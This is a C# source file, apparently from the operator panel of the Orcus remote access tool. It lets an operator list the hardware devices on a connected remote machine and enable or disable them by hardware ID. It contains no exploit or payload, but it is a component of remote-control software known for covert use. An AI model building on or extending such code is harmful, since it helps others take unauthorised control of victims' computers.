using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.DeviceManager;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.DeviceManager
{
    public class DeviceManagerCommand : Command
    {
        public event EventHandler<List<DeviceInfo>> DevicesReceived;
        public event EventHandler<DeviceChangedEventArgs> DeviceStateChanged;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((DeviceManagerCommunication) parameter[0])
            {
                case DeviceManagerCommunication.ResponseDevices:
                    var devices = new Serializer(typeof (List<DeviceInfo>)).Deserialize<List<DeviceInfo>>(parameter, 1);
                    foreach (var deviceInfo in devices)
                    {
                        deviceInfo.DriverBuildDate = deviceInfo.DriverBuildDate.ToLocalTime();
                        deviceInfo.DriverInstallDate = deviceInfo.DriverInstallDate.ToLocalTime();
                    }
                    LogService.Receive(string.Format((string) Application.Current.Resources["DevicesReceived"],
                        devices.Count));
                    DevicesReceived?.Invoke(this, devices);
                    break;
                case DeviceManagerCommunication.DeviceStateChangedSuccessfully:
                    var enabled = parameter[1] == 1;
                    var hardwareId = Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2);
                    LogService.Receive((string) Application.Current.Resources["DeviceStateChangedSuccessfully"]);
                    DeviceStateChanged?.Invoke(this, new DeviceChangedEventArgs(hardwareId, enabled));
                    break;
                case DeviceManagerCommunication.ErrorChangingDeviceState:
                    LogService.Error(string.Format((string) Application.Current.Resources["ErrorChangeDeviceState"],
                        Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1)));
                    break;
                case DeviceManagerCommunication.ErrorDeviceNotFound:
                    LogService.Error((string) Application.Current.Resources["ErrorDeviceNotFound"]);
                    break;
            }
        }

        public void GetAllDevices()
        {
            ConnectionInfo.SendCommand(this, new[] {(byte) DeviceManagerCommunication.GetDevices});
            LogService.Send((string)Application.Current.Resources["GetDevices"]);
        }

        public void SetDeviceState(DeviceInfo deviceInfo, bool enable)
        {
            var data = Encoding.UTF8.GetBytes(deviceInfo.HardwareId);
            ConnectionInfo.UnsafeSendCommand(this, data.Length + 2, writer =>
            {
                writer.Write((byte) DeviceManagerCommunication.SetDeviceState);
                writer.Write((byte) (enable ? 1 : 0));
                writer.Write(data);
            });

            LogService.Send(string.Format((string) Application.Current.Resources["ChangeDeviceState"], deviceInfo.Name));
        }

        protected override uint GetId()
        {
            return 30;
        }
    }
}